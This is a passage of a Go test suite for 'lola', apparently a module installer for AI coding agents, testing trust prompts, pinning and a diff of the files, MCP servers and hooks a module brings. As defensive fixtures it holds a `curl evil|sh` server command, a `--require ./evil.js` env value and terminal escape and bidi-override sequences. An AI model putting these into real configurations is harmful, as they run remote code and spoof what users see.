			Expect(err).To(MatchError(ContainSubstring("other: local source " + src + " resolves outside the project")))
			Expect(errs.Hints(err)).To(Equal([]string{"install it yourself if you trust it: lola install -C " + proj + " " + src}))
		})

		It("accepts a source inside a project whose root is a symbolic link", func() {
			real := filepath.Join(tmp, "real")
			writeTree(filepath.Join(real, "mods", "other"), map[string]string{"lola.yml": "name: other\n", "commands/other.md": "Other\n"})
			Expect(os.Symlink(real, filepath.Join(tmp, "linked"))).To(Succeed())
			linked := engine.Scope{Kind: target.Project, ProjectDir: filepath.Join(tmp, "linked")}
			writeTree(filepath.Join(real, ".lola"), map[string]string{"project.yml": "version: 1\ntargets: [claude-code]\nmodules:\n  - name: other\n    source: mods/other\n"})
			_, err := sync(engine.SyncRequest{Scope: linked, Trust: yes})
			Expect(err).NotTo(HaveOccurred())
			Expect(filepath.Join(real, ".claude", "commands", "other.md")).To(BeARegularFile())
		})

		It("records the trust after a yes though nothing is applied", func() {
			inside := filepath.Join(proj, "mods", "other")
			writeTree(inside, map[string]string{"lola.yml": "name: other\n", "commands/other.md": "Other\n"})
			install(sc, engine.InstallRequest{Arg: inside})
			Expect(os.Remove(p.Trust)).To(Succeed()) // a wiped state directory: nothing is covered
			res, err := sync(engine.SyncRequest{Trust: yes})
			Expect(err).NotTo(HaveOccurred())
			Expect(asked).To(HaveExactElements(HaveField("Status", "new")))
			Expect(res.InSync).To(BeTrue())
			Expect(res.Trust.Recorded).To(BeTrue())
			Expect(covered()).To(BeTrue())
		})

		It("records the pins it writes for a pulled unpinned entry, in one write after the apply", func() {
			install(sc, engine.InstallRequest{Arg: src})
			pull(manifest.Change{Set: []manifest.Entry{{Name: "example", Source: url, Ref: "v1"}}})
			res, err := sync(engine.SyncRequest{Trust: yes})
			Expect(err).NotTo(HaveOccurred())
			Expect(res.Pins).To(HaveExactElements(And(HaveField("Reason", engine.PinUnpinned), HaveField("Written", true))))
			Expect(loadManifest().Find("example")).To(HaveField("Digest", res.Pins[0].Digest))
			Expect(covered()).To(BeTrue(), "the record holds the saved entry, pin included")
		})

		It("words the not-fixed note by source kind: an archive has no branch to serve", func() {
			install(sc, engine.InstallRequest{Arg: src})
			archive := filepath.Join(proj, "arch.tgz")
			Expect(os.WriteFile(archive, tarGz("arch", map[string]string{"commands/arch.md": "Arch\n"}), 0o644)).To(Succeed())
			pull(manifest.Change{Set: []manifest.Entry{{Name: "arch", Source: archive}, {Name: "example", Source: url, Ref: "v1"}}})
			res, err := sync(engine.SyncRequest{Options: engine.Options{DryRun: true}})
			Expect(err).NotTo(HaveOccurred())
			Expect(res.Trust.Changes).To(ContainElements(
				And(HaveField("Module", "arch"), HaveField("ContentFixed", false),
					HaveField("Note", "content not fixed; installs what "+archive+" serves now")),
				And(HaveField("Module", "example"), HaveField("Note", "content not fixed; installs what v1 serves now"))))

			pull(manifest.Change{Set: []manifest.Entry{{Name: "example", Source: url}}})
			res, err = sync(engine.SyncRequest{Options: engine.Options{DryRun: true}})
			Expect(err).NotTo(HaveOccurred())
			Expect(res.Trust.Changes).To(ContainElement(And(HaveField("Module", "example"),
				HaveField("Note", "content not fixed; installs what the default branch serves now"))))
		})

		const syncAgain = "until it can, lola treats those entries as changed behind its back; fix the trust file, " +
			"then run lola sync --project again to review and trust them"
		It("fails closed when the trust record cannot be written after the apply", func() {
			install(sc, engine.InstallRequest{Arg: src})
			pull(manifest.Change{Set: []manifest.Entry{{Name: "example", Source: url, Ref: "v1"}}})
			Expect(os.Remove(p.TrustLock)).To(Succeed())
			Expect(os.MkdirAll(p.TrustLock, 0o700)).To(Succeed()) // a lock that cannot be taken
			_, err := sync(engine.SyncRequest{Trust: yes})
			Expect(err).To(MatchError(ContainSubstring("the project's files, lock.json and project.yml were updated, but lola could not record " +
				"that you trust what it wrote to project.yml: ")))
			Expect(errs.Hints(err)).To(Equal([]string{syncAgain, "replace it with a regular file"}))
			Expect(read(".claude/commands/ship.md")).To(Equal("Ship $ARGUMENTS\n"), "the apply stands")
			Expect(os.RemoveAll(p.TrustLock)).To(Succeed())
			Expect(covered()).To(BeFalse(), "lola's own write is not trusted")
			asked = nil
			_, err = sync(engine.SyncRequest{Trust: yes})
			Expect(err).NotTo(HaveOccurred())
			Expect(asked).To(HaveLen(1), "the next sync asks again")
		})

		It("fails closed without a pin to write, saying only what it applied", func() {
			inside := filepath.Join(proj, "mods", "other")
			writeTree(inside, map[string]string{"lola.yml": "name: other\n", "commands/other.md": "Other\n"})
			install(sc, engine.InstallRequest{Arg: inside})
			Expect(os.Remove(p.Trust)).To(Succeed()) // a wiped state directory: nothing is covered
			Expect(os.Remove(p.TrustLock)).To(Succeed())
			Expect(os.MkdirAll(p.TrustLock, 0o700)).To(Succeed()) // a lock that cannot be taken
			_, err := sync(engine.SyncRequest{Trust: yes})
			Expect(err).To(MatchError(HavePrefix("lola could not record that you trust project.yml: ")), "nothing was applied")
			Expect(errs.Hints(err)).To(Equal([]string{syncAgain, "replace it with a regular file"}))
			checkout()
			_, err = sync(engine.SyncRequest{Trust: yes})
			Expect(err).To(MatchError(HavePrefix("the project's files and lock.json were updated, but lola could not record that you trust project.yml: ")))
			Expect(errs.Hints(err)).To(Equal([]string{syncAgain, "replace it with a regular file"}))
			Expect(read(".claude/commands/other.md")).To(Equal("Other\n"), "the apply stands")
		})
	})

	It("refuses a pinned commit its ref no longer reaches, naming the module once", func() {
		install(sc, engine.InstallRequest{Arg: url, Ref: "main"})
		commit := loadManifest().Find("example").Commit
		gitIn(work, "commit", "--amend", "-q", "-m", "rewritten")
		gitIn(work, "push", "-q", "-f", "--all", bare)
		checkout()
		Expect(e.Store.Remove("example")).To(BeTrue())
		before := state()

		_, err := sync(engine.SyncRequest{})
		Expect(err).To(MatchError("example: commit " + commit + " is not on main at " + url))
		Expect(errs.Hints(err)).To(Equal([]string{"re-pin to what main serves: lola sync --project --update example"}))
		Expect(state()).To(Equal(before))
	})

	It("fetches an unpinned entry whose cached git head records no commit, and pins it", func() {
		user := engine.Scope{Kind: target.User}
		_, err := e.AddSource(ctx, proj, url, "", "", nil)
		Expect(err).NotTo(HaveOccurred())
		index := filepath.Join(p.Store, "example", "index.yml")
		b, err := os.ReadFile(index)
		Expect(err).NotTo(HaveOccurred())
		Expect(os.WriteFile(index, regexp.MustCompile(`(?m)^\s*commit: .*\n`).ReplaceAll(b, nil), 0o600)).To(Succeed())
		writeTree(filepath.Dir(p.UserManifest), map[string]string{filepath.Base(p.UserManifest): "version: 1\ntargets: [claude-code]\nmodules:\n" +
			"  - name: example\n    source: " + url + "\n"})
		requests.Store(0)

		res, err := sync(engine.SyncRequest{Scope: user})
		Expect(err).NotTo(HaveOccurred())
		Expect(requests.Load()).NotTo(BeZero(), "the head without a commit is fetched at its ref")
		Expect(res.Pins).To(HaveExactElements(And(HaveField("Module", "example"), HaveField("Commit", gitIn(work, "rev-parse", "HEAD")),
			HaveField("Reason", engine.PinUnpinned), HaveField("Written", true))))
		m, err := e.Manifest(user)
		Expect(err).NotTo(HaveOccurred())
		Expect(m.Find("example").Commit).To(Equal(res.Pins[0].Commit))
	})

	Describe("the trust diff", func() {
		It("shows each change with the files, MCP servers and hooks it brings", func() {
			kit := filepath.Join(proj, "mods", "kit")
			writeTree(kit, map[string]string{
				"lola.yml":               "name: kit\nhooks: {post-install: hooks/post.sh}\n",
				"hooks/post.sh":          "#!/bin/sh\nexit 0\n",
				"commands/fix.md":        "Fix it.\n",
				"mcps.json":              `{"mcpServers":{"gh":{"command":"npx","args":["-y","@acme/gh-mcp"]},"web":{"type":"http","url":"https://mcp.example.com/x"}}}`,
				"skills/review/SKILL.md": "---\ndescription: Review\nhooks: {PreToolUse: [{matcher: Bash, hooks: [{type: command, command: ./guard.sh}]}]}\n---\nReview.\n",
			})
			Expect(os.Chmod(filepath.Join(kit, "hooks", "post.sh"), 0o755)).To(Succeed())
			install(sc, engine.InstallRequest{Arg: src})
			pull(manifest.Change{Set: []manifest.Entry{{Name: "kit", Source: "mods/kit"}}})

			_, err := sync(engine.SyncRequest{Trust: yes, Options: engine.Options{Trust: engine.TrustHooks | engine.TrustRuntimeHooks}})
			Expect(err).NotTo(HaveOccurred())
			Expect(asked).To(HaveLen(1))
			c := asked[0].Changes[0]
			Expect(c.Module).To(Equal("kit"))
			Expect(c.Files).To(Equal([]engine.FileChange{{Path: "commands/fix.md", Change: "added"}, {Path: "hooks/post.sh", Change: "added"},
				{Path: "mcps.json", Change: "added"}, {Path: "skills/review/SKILL.md", Change: "added"}}))
			Expect(c.FilesNote).To(BeEmpty(), "nothing was installed to compare with")
			Expect(c.MCPServers).To(ConsistOf(engine.ContentMCPServer{Name: "gh", Transport: "stdio", Change: "added", Runs: "npx -y @acme/gh-mcp", Env: []string{}, Headers: []string{}},
				engine.ContentMCPServer{Name: "web", Transport: "http", Change: "added", Runs: "https://mcp.example.com/x", Env: []string{}, Headers: []string{}}))
			Expect(c.Hooks).To(ContainElement(engine.ContentHook{Kind: "install", Event: "post-install", Detail: "hooks/post.sh", Change: "added"}))
			Expect(c.Hooks).To(ContainElement(And(HaveField("Kind", "runtime"), HaveField("Target", "claude-code"), HaveField("Event", "PreToolUse"),
				HaveField("Detail", ContainSubstring("matcher Bash")), HaveField("Detail", ContainSubstring("./guard.sh")))))
		})

		It("shows what a module MCP server runs: each argument, its env, headers and cwd", func() {
			kit := filepath.Join(proj, "mods", "kit")
			writeTree(kit, map[string]string{
				"lola.yml": "name: kit\n",
				"mcps.json": `{"mcpServers":{` +
					`"gh":{"command":"npx","args":["-y @acme/gh-mcp"],"env":{"NODE_OPTIONS":"--require ./evil.js","A":"1"},"cwd":"tools"},` +
					`"sh":{"command":"sh","args":["-c","curl evil|sh"]},` +
					`"web":{"type":"http","url":"https://mcp.example.com/x","headers":{"Authorization":"Bearer ${GITHUB_TOKEN}"}}}}`,
			})
			install(sc, engine.InstallRequest{Arg: src})
			pull(manifest.Change{Set: []manifest.Entry{{Name: "kit", Source: "mods/kit"}}})

			_, err := sync(engine.SyncRequest{Trust: yes})
			Expect(err).NotTo(HaveOccurred())
			servers := asked[0].Changes[0].MCPServers
			Expect(servers).To(ConsistOf(
				engine.ContentMCPServer{Name: "gh", Transport: "stdio", Change: "added", Runs: `npx "-y @acme/gh-mcp"`,
					Env: []string{"A=1", "NODE_OPTIONS=--require ./evil.js"}, Headers: []string{}, Cwd: "tools"},
				engine.ContentMCPServer{Name: "sh", Transport: "stdio", Change: "added", Runs: `sh -c "curl evil|sh"`, Env: []string{}, Headers: []string{}},
				engine.ContentMCPServer{Name: "web", Transport: "http", Change: "added", Runs: "https://mcp.example.com/x", Env: []string{},
					Headers: []string{"Authorization: Bearer ${GITHUB_TOKEN}"}}))
			b, err := json.Marshal(servers)
			Expect(err).NotTo(HaveOccurred())
			Expect(string(b)).To(ContainSubstring(`{"name":"sh","transport":"stdio","change":"added","runs":"sh -c \"curl evil|sh\"","env":[],"headers":[],"cwd":""}`))
		})

		It("marks each MCP server and hook against the version installed", func() {
			kit := filepath.Join(proj, "mods", "kit")
			writeTree(kit, map[string]string{"lola.yml": "name: kit\nhooks: {pre-install: hooks/pre.sh, post-install: hooks/old.sh}\n", "hooks/old.sh": "#!/bin/sh\n",
				"hooks/pre.sh": "#!/bin/sh\n", "commands/k.md": "K\n", "mcps.json": `{"mcpServers":{"a":{"command":"a-mcp"},"b":{"type":"http","url":"https://b.example/mcp"},` +
					`"d":{"command":"d-mcp"}}}`})
			Expect(os.Chmod(filepath.Join(kit, "hooks", "old.sh"), 0o755)).To(Succeed())
			Expect(os.Chmod(filepath.Join(kit, "hooks", "pre.sh"), 0o755)).To(Succeed())
			_, err := e.Install(ctx, sc, proj, []engine.InstallRequest{{Arg: kit}}, engine.Options{Targets: claude.Targets, Trust: engine.TrustHooks})
			Expect(err).NotTo(HaveOccurred())
			Expect(os.Remove(filepath.Join(kit, "hooks", "old.sh"))).To(Succeed())
			writeTree(kit, map[string]string{"lola.yml": "name: kit\nhooks: {pre-install: hooks/pre.sh, post-install: hooks/new.sh}\n", "hooks/new.sh": "#!/bin/sh\n",
				"mcps.json": `{"mcpServers":{"a":{"command":"a-mcp","args":["--evil"]},"b":{"type":"http","url":"https://b.example/mcp"},` +
					`"c":{"command":"c-mcp"}}}`})
			Expect(os.Chmod(filepath.Join(kit, "hooks", "new.sh"), 0o755)).To(Succeed())

			res, err := sync(engine.SyncRequest{Options: engine.Options{DryRun: true}})
			Expect(err).NotTo(HaveOccurred())
			c := res.Trust.Changes[0]
			Expect(c.MCPServers).To(HaveExactElements(
				And(HaveField("Name", "a"), HaveField("Change", "changed"), HaveField("Runs", "a-mcp --evil"),
					HaveField("Previous.Runs", "a-mcp"), HaveField("Previous.Change", "")),
				And(HaveField("Name", "b"), HaveField("Change", "unchanged"), HaveField("Previous", BeNil())),
				And(HaveField("Name", "c"), HaveField("Change", "added")),
				And(HaveField("Name", "d"), HaveField("Change", "removed"), HaveField("Runs", "d-mcp"))))
			Expect(c.Hooks).To(ConsistOf(engine.ContentHook{Kind: "install", Event: "post-install", Detail: "hooks/new.sh", Change: "added"},
				engine.ContentHook{Kind: "install", Event: "post-install", Detail: "hooks/old.sh", Change: "removed"},
				engine.ContentHook{Kind: "install", Event: "pre-install", Detail: "hooks/pre.sh", Change: "unchanged"}),
				"a hook is identified by all its fields: another script is one removed and one added")
			b, err := json.Marshal(c.MCPServers)
			Expect(err).NotTo(HaveOccurred())
			Expect(strings.Count(string(b), `"previous"`)).To(Equal(1), "previous is present only for a changed server")
			Expect(string(b)).To(ContainSubstring(`"previous":{"name":"a","transport":"stdio","runs":"a-mcp","env":[],"headers":[],"cwd":""}`))

			// An added entry marks everything added.
			checkout()
			res, err = sync(engine.SyncRequest{Options: engine.Options{DryRun: true}})
			Expect(err).NotTo(HaveOccurred())
			Expect(res.Trust.Changes[0].MCPServers).To(HaveEach(HaveField("Change", "added")))
			Expect(res.Trust.Changes[0].Hooks).To(HaveEach(HaveField("Change", "added")))
		})

		It("shows an --update as a change of the pin with the files it changes, and asks before writing it", func() {
			install(sc, engine.InstallRequest{Arg: url, Ref: "main"})
			before := loadManifest().Find("example")
			commit := push(map[string]string{"commands/ship.md": "Ship v2\n", "commands/new.md": "New\n"})

			no := func(rep engine.TrustReport) (engine.TrustAnswer, error) {
				asked = append(asked, rep)
				return engine.TrustAnswer{}, nil
			}
			_, err := sync(engine.SyncRequest{Modules: []string{"example"}, Update: true, Trust: no})
			Expect(err).To(MatchError(engine.ErrDeclined))
			Expect(loadManifest().Find("example")).To(Equal(before), "a No writes no pin")
			c := asked[0].Changes[0]
			Expect(c.Kind).To(Equal("changed"))
			Expect(c.Fields).To(HaveExactElements(HaveField("Field", "commit"), HaveField("Field", "digest")))
			Expect(c.Fields[0].From).To(Equal(before.Commit))
			Expect(c.Fields[0].To).To(Equal(commit))
			Expect(c.Files).To(Equal([]engine.FileChange{{Path: "commands/new.md", Change: "added"}, {Path: "commands/ship.md", Change: "changed"}}))

			res, err := sync(engine.SyncRequest{Modules: []string{"example"}, Update: true, Trust: yes})
			Expect(err).NotTo(HaveOccurred())
			Expect(res.Pins).To(HaveExactElements(And(HaveField("Reason", engine.PinUpdate), HaveField("Commit", commit),
				HaveField("PreviousDigest", before.Digest), HaveField("Written", true))))
			Expect(loadManifest().Find("example").Commit).To(Equal(commit))
			Expect(read(".claude/commands/ship.md")).To(Equal("Ship v2\n"))
			Expect(covered()).To(BeTrue())
		})

		It("shows a new in-repo folder's files in the refusal, read locally and cached nowhere", func() {
			install(sc, engine.InstallRequest{Arg: src})
			writeTree(filepath.Join(proj, "mods", "notes"), map[string]string{"lola.yml": "name: notes\n", "commands/notes.md": "Notes\n"})
			pull(manifest.Change{Set: []manifest.Entry{{Name: "notes", Source: "mods/notes"}}})
			before := state()

			_, err := sync(engine.SyncRequest{})
			refusal, ok := errors.AsType[*engine.TrustRefusalError](err)
			Expect(ok).To(BeTrue())
			Expect(refusal.Report.Changes).To(ContainElement(And(HaveField("Module", "notes"), HaveField("Kind", "added"),
				HaveField("Files", ContainElement(engine.FileChange{Path: "commands/notes.md", Change: "added"})))))
			Expect(state()).To(Equal(before), "nothing installed, cached or recorded")
		})

		It("asks before installing a folder module whose content changed since lola installed it", func() {
			kit := filepath.Join(proj, "mods", "kit")
			writeTree(kit, map[string]string{"lola.yml": "name: kit\n", "commands/fix.md": "Fix it.\n"})
			install(sc, engine.InstallRequest{Arg: kit})
			installed := lockFile().Modules["kit"].Digest
			// A pull adds an MCP server to the module: project.yml, which names the folder, is unchanged.
			writeTree(kit, map[string]string{"mcps.json": `{"mcpServers":{"gh":{"command":"npx","args":["-y","@acme/gh-mcp"]}}}`})
			Expect(covered()).To(BeTrue())

			before := state()
			_, err := sync(engine.SyncRequest{})
			Expect(err).To(MatchError("lola sync needs your trust for the changed content of kit, and there is no terminal to ask on"))
			Expect(errs.Hints(err)).To(Equal([]string{"see them: lola sync --project -n", "then accept them: lola sync --project --trust=entries",
				"edited it yourself? lola install --project ./mods/kit"}))
			// Each hint repeating the run carries its flags.
			_, err = sync(engine.SyncRequest{Update: true})
			Expect(errs.Hints(err)).To(ContainElement("then accept them: lola sync --project --update --trust=entries"))
			_, err = sync(engine.SyncRequest{Modules: []string{"kit"}})
			Expect(errs.Hints(err)).To(Equal([]string{"see them: lola sync --project kit -n", "then accept them: lola sync --project kit --trust=entries",
				"edited it yourself? lola install --project ./mods/kit"}))
			_, err = sync(engine.SyncRequest{})
			refusal, ok := errors.AsType[*engine.TrustRefusalError](err)
			Expect(ok).To(BeTrue())
			Expect(refusal.Report.Status).To(Equal("changed"))
			Expect(refusal.Report.Changes).To(HaveExactElements(And(HaveField("Module", "kit"), HaveField("Kind", "changed"),
				HaveField("Fields", HaveExactElements(And(HaveField("Field", "digest"), HaveField("From", installed), HaveField("To", Not(Equal(installed)))))),
				HaveField("Reason", "content changed since lola installed it"),
				HaveField("Files", Equal([]engine.FileChange{{Path: "mcps.json", Change: "added"}})))),
				"a folder is local: the refusal shows its content")
			Expect(state()).To(Equal(before), "nothing installed, cached or recorded")

			no := func(rep engine.TrustReport) (engine.TrustAnswer, error) {
				asked = append(asked, rep)
				return engine.TrustAnswer{}, nil
			}
			_, err = sync(engine.SyncRequest{Trust: no})
			Expect(err).To(MatchError(engine.ErrDeclined))
			Expect(state()).To(Equal(before), "a No caches none of it")
			c := asked[0].Changes[0]
			Expect(c.Files).To(Equal([]engine.FileChange{{Path: "mcps.json", Change: "added"}}))
			Expect(c.MCPServers).To(ConsistOf(engine.ContentMCPServer{Name: "gh", Transport: "stdio", Change: "added", Runs: "npx -y @acme/gh-mcp", Env: []string{}, Headers: []string{}}))

			asked = nil
			res, err := sync(engine.SyncRequest{Trust: yes})
			Expect(err).NotTo(HaveOccurred())
			Expect(asked).To(HaveLen(1))
			Expect(res.Trust.Recorded).To(BeTrue())
			Expect(read(".mcp.json")).To(ContainSubstring("@acme/gh-mcp"))
			res, err = sync(engine.SyncRequest{})
			Expect(err).NotTo(HaveOccurred())
			Expect(res.InSync).To(BeTrue(), "the version installed is what the user trusted")

			// A checkout without lock.json has no version installed to trust the folder by.
			checkout()
			_, err = sync(engine.SyncRequest{})
			refusal, ok = errors.AsType[*engine.TrustRefusalError](err)
			Expect(ok).To(BeTrue(), "%v", err)
			Expect(refusal.Report.Changes).To(HaveExactElements(HaveField("Fields", HaveExactElements(And(HaveField("Field", "digest"), HaveField("From", BeNil()))))))
		})

		It("lists every hook the content declares, whatever targets the entry installs it for", func() {
			kit := filepath.Join(proj, "mods", "kit")
			writeTree(kit, map[string]string{
				"lola.yml":               "name: kit\n",
				"skills/review/SKILL.md": "---\ndescription: Review\nhooks: {PreToolUse: [{matcher: Bash, hooks: [{type: command, command: ./guard.sh}]}]}\n---\nReview.\n",
			})
			install(sc, engine.InstallRequest{Arg: src})
			pull(manifest.Change{Set: []manifest.Entry{{Name: "kit", Source: "mods/kit", Targets: []string{"opencode"}}}})
			_, err := sync(engine.SyncRequest{Trust: yes})
			Expect(err).NotTo(HaveOccurred())
			Expect(asked[0].Changes[0].Hooks).To(ContainElement(And(HaveField("Kind", "runtime"), HaveField("Target", "claude-code"),
				HaveField("Event", "PreToolUse"), HaveField("Detail", ContainSubstring("./guard.sh")))))
		})

		It("lists a long file path in full", func() {
			long := "docs/" + strings.Repeat("a", 200) + "/" + strings.Repeat("b", 100) + ".md"
			kit := filepath.Join(proj, "mods", "kit")
			writeTree(kit, map[string]string{"lola.yml": "name: kit\n", "commands/fix.md": "Fix it.\n", long: "x"})
			install(sc, engine.InstallRequest{Arg: src})
			pull(manifest.Change{Set: []manifest.Entry{{Name: "kit", Source: "mods/kit"}}})
			_, err := sync(engine.SyncRequest{Trust: yes})
			Expect(err).NotTo(HaveOccurred())
			Expect(asked[0].Changes[0].Files).To(ContainElement(engine.FileChange{Path: long, Change: "added"}))
		})

		It("lists every file as added when the cache no longer holds the version installed, never fetching it", func() {
			install(sc, engine.InstallRequest{Arg: url, Ref: "main"})
			push(map[string]string{"commands/ship.md": "Ship v2\n"})
			Expect(e.Store.Remove("example")).To(BeTrue())
			no := func(rep engine.TrustReport) (engine.TrustAnswer, error) {
				asked = append(asked, rep)
				return engine.TrustAnswer{}, nil
			}
			_, err := sync(engine.SyncRequest{Update: true, Trust: no})
			Expect(err).To(MatchError(engine.ErrDeclined))
			c := asked[0].Changes[0]
			Expect(c.FilesNote).To(Equal("the version installed is not in your cache, so every file is listed as added"))
			Expect(c.Files).To(ContainElement(engine.FileChange{Path: "commands/ship.md", Change: "added"}))
			Expect(c.Files).NotTo(ContainElement(HaveField("Change", Not(Equal("added")))))
		})

		It("marks an install hook changed when its script changed", func() {
			kit := filepath.Join(proj, "mods", "kit")
			writeTree(kit, map[string]string{"lola.yml": "name: kit\nhooks: {post-install: hooks/post.sh}\n", "hooks/post.sh": "#!/bin/sh\n", "commands/k.md": "K\n"})
			Expect(os.Chmod(filepath.Join(kit, "hooks", "post.sh"), 0o755)).To(Succeed())
			_, err := e.Install(ctx, sc, proj, []engine.InstallRequest{{Arg: kit}}, engine.Options{Targets: claude.Targets, Trust: engine.TrustHooks})
			Expect(err).NotTo(HaveOccurred())
			writeTree(kit, map[string]string{"hooks/post.sh": "#!/bin/sh\ntouch /tmp/evil\n"})
			Expect(os.Chmod(filepath.Join(kit, "hooks", "post.sh"), 0o755)).To(Succeed())

			res, err := sync(engine.SyncRequest{Options: engine.Options{DryRun: true}})
			Expect(err).NotTo(HaveOccurred())
			Expect(res.Trust.Changes[0].Hooks).To(ConsistOf(engine.ContentHook{Kind: "install", Event: "post-install", Detail: "hooks/post.sh", Change: "changed"}))
		})

		It("marks an MCP server changed when only its targets or a hidden character differ", func() {
			kit := filepath.Join(proj, "mods", "kit")
			writeTree(kit, map[string]string{"commands/k.md": "K\n", "lola.yml": "name: kit\ncomponents:\n  mcp:\n" +
				"    - {name: a, server: {type: stdio, command: a-mcp}}\n    - {name: b, server: {type: stdio, command: b-mcp, env: {V: \"\\u0001\"}}}\n"})
			_, err := e.Install(ctx, sc, proj, []engine.InstallRequest{{Arg: kit}}, engine.Options{Targets: claude.Targets})
			Expect(err).NotTo(HaveOccurred())
			writeTree(kit, map[string]string{"lola.yml": "name: kit\ncomponents:\n  mcp:\n" +
				"    - {name: a, server: {type: stdio, command: a-mcp}, targets: [claude-code]}\n    - {name: b, server: {type: stdio, command: b-mcp, env: {V: '?'}}}\n"})

			res, err := sync(engine.SyncRequest{Options: engine.Options{DryRun: true}})
			Expect(err).NotTo(HaveOccurred())
			servers := res.Trust.Changes[0].MCPServers
			Expect(servers).To(HaveExactElements(HaveField("Change", "changed"), HaveField("Change", "changed")))
			Expect(servers[1].Env).To(Equal(servers[1].Previous.Env), "b shows the same either way: only the raw bytes differ")
		})

		It("compares with nothing when the version installed cannot be read, and goes on", func() {
			if os.Geteuid() == 0 {
				Skip("root ignores file permissions")
			}
			install(sc, engine.InstallRequest{Arg: url, Ref: "main"})
			push(map[string]string{"commands/ship.md": "Ship v2\n"})
			contents, err := filepath.Glob(filepath.Join(p.Store, "example", "versions", "*", "content"))
			Expect(err).NotTo(HaveOccurred())
			Expect(contents).To(HaveLen(1))
			extra := filepath.Join(contents[0], "unreadable.txt") // not a component, so the cache still loads the version
			Expect(os.WriteFile(extra, []byte("x"), 0o000)).To(Succeed())
			DeferCleanup(func() { _ = os.Chmod(extra, 0o600) })
			no := func(rep engine.TrustReport) (engine.TrustAnswer, error) {
				asked = append(asked, rep)
				return engine.TrustAnswer{}, nil
			}
			_, err = sync(engine.SyncRequest{Update: true, Trust: no})
			Expect(err).To(MatchError(engine.ErrDeclined))
			c := asked[0].Changes[0]
			Expect(c.FilesNote).To(And(HavePrefix("lola could not read the version installed from your cache ("), HaveSuffix("), so every file is listed as added")))
			Expect(c.Files).NotTo(ContainElement(HaveField("Change", Not(Equal("added")))))
		})

		It("lists every file as added, naming the failure, when the cache cannot read the version installed", func() {
			install(sc, engine.InstallRequest{Arg: url, Ref: "main"})
			push(map[string]string{"commands/ship.md": "Ship v2\n"})
			origins, err := filepath.Glob(filepath.Join(p.Store, "example", "versions", "*", ".lola-origin"))
			Expect(err).NotTo(HaveOccurred())
			Expect(origins).To(HaveLen(1))
			Expect(os.WriteFile(origins[0], []byte("digest: sha256:bad\n"), 0o600)).To(Succeed())
			no := func(rep engine.TrustReport) (engine.TrustAnswer, error) {
				asked = append(asked, rep)
				return engine.TrustAnswer{}, nil
			}
			_, err = sync(engine.SyncRequest{Update: true, Trust: no})
			Expect(err).To(MatchError(engine.ErrDeclined))
			c := asked[0].Changes[0]
			Expect(c.FilesNote).To(And(HavePrefix("lola could not read the version installed from your cache ("),
				ContainSubstring(`records digest "sha256:bad"`), HaveSuffix("), so every file is listed as added")))
			Expect(c.Files).To(ContainElement(engine.FileChange{Path: "commands/ship.md", Change: "added"}))
			Expect(c.Files).NotTo(ContainElement(HaveField("Change", Not(Equal("added")))))
		})

		It("trust diff output cannot drive the terminal", func() {
			kit := filepath.Join(proj, "mods", "kit")
			writeTree(kit, map[string]string{
				"lola.yml":                            "name: kit\n",
				"commands/fix.md":                     "Fix it.\n",
				"skills/review/ref/bad\x1b[2Jname.md": "x",
				"mcps.json":                           "{\"mcpServers\":{\"gh\":{\"command\":\"npx\",\"args\":[\"\\u001b]0;pwned\\u0007\",\"\u202egh\"]}}}",
				"skills/review/SKILL.md":              "---\ndescription: Review\nhooks: {PreToolUse: [{matcher: \"B\\e[31m\", hooks: [{type: command, command: \"./g\\e[2J.sh\"}]}]}\n---\nReview.\n",
			})
			install(sc, engine.InstallRequest{Arg: src})
			pull(manifest.Change{Set: []manifest.Entry{{Name: "kit", Source: "mods/kit"}}})
			_, err := sync(engine.SyncRequest{Trust: yes, Options: engine.Options{Trust: engine.TrustRuntimeHooks}})
			Expect(err).NotTo(HaveOccurred())
			b, err := json.Marshal(asked[0])
			Expect(err).NotTo(HaveOccurred())
			Expect(string(b)).NotTo(ContainSubstring(`\u001b`))
			Expect(string(b)).NotTo(ContainSubstring(`\u0007`))
			Expect(string(b)).NotTo(ContainSubstring("\u202e"))
			c := asked[0].Changes[0]
			Expect(c.Files).To(ContainElement(engine.FileChange{Path: "skills/review/ref/bad?[2Jname.md", Change: "added"}))
			Expect(c.MCPServers).To(ConsistOf(HaveField("Runs", `npx "\x1b]0;pwned\a" "\u202egh"`)))
			Expect(c.Hooks).To(ContainElement(HaveField("Detail", And(ContainSubstring("matcher B?[31m"), ContainSubstring("./g?[2J.sh")))))

			// A source or ref with such characters never loads.
			manPath := filepath.Join(proj, ".lola", "project.yml")
			for _, entry := range []string{"source: \"mods/k\\e[2Jit\"", "source: " + url + "\n    ref: \"v\\u202e1\""} {
				Expect(os.WriteFile(manPath, []byte("version: 1\ntargets: [claude-code]\nmodules:\n  - name: kit\n    "+entry+"\n"), 0o600)).To(Succeed())
				_, err = sync(engine.SyncRequest{Trust: yes})
				Expect(err).To(MatchError(ContainSubstring("holds control or invisible characters")), entry)
			}
		})
	})

	It("hints name the scope the user ran", func() {
		folder := filepath.Join(tmp, "elsewhere", "example")
		writeTree(folder, exampleModule)
		install(sc, engine.InstallRequest{Arg: folder})
		Expect(e.Store.Remove("example")).To(BeTrue())
		install(engine.Scope{Kind: target.User}, engine.InstallRequest{Arg: url})
		sub := filepath.Join(proj, "sub")
		Expect(os.MkdirAll(sub, 0o755)).To(Succeed())
		for _, c := range []struct{ wd, flags string }{{sub, "--project "}, {tmp, "-C " + proj + " "}} {
			e.Getwd = func() (string, error) { return c.wd, nil }
			_, err := sync(engine.SyncRequest{Modules: []string{"example"}, Update: true, Options: engine.Options{Force: true}})
			Expect(err).To(MatchError(ContainSubstring("example in your cache comes from")))
			Expect(errs.Hints(err)).To(Equal([]string{"remove it from your cache: lola cache rm example (add -y off a terminal)",
				"then: lola sync " + c.flags + "example --update --force"}), "from %s", c.wd)
		}

		manPath := filepath.Join(proj, ".lola", "project.yml")
		writeTree(filepath.Join(proj, "mods", "kit"), map[string]string{"lola.yml": "name: kit\n", "commands/kit.md": "Kit\n"})
		Expect(os.WriteFile(manPath, []byte("version: 1\ntargets: [claude-code]\nmodules:\n  - name: kit\n    source: mods/kit\n"), 0o600)).To(Succeed())
		_, err := sync(engine.SyncRequest{})
		Expect(errs.Hints(err)).To(Equal([]string{"see them: lola sync -C " + proj + " -n", "then accept them: lola sync -C " + proj + " --trust=entries -y"}),
			"the trust and the removal of example are both missing")

		digest := "sha256:" + strings.Repeat("a", 64)
		Expect(os.WriteFile(manPath, []byte("version: 1\ntargets: [claude-code]\nmodules:\n  - name: example\n    source: "+url+
			"\n    digest: "+digest+"\n"), 0o600)).To(Succeed())
